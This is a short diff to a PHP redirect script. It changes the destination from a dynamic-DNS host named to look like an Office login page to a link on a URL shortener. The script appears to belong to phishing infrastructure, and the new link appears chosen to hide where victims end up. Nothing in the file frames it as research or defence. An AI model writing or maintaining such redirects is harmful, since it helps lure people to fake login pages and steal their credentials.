@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://login-office-php.theworkpc.com/"); 
+header("Location: https://n9.cl/vmz8p/"); 
   
 exit; 
 ?> 
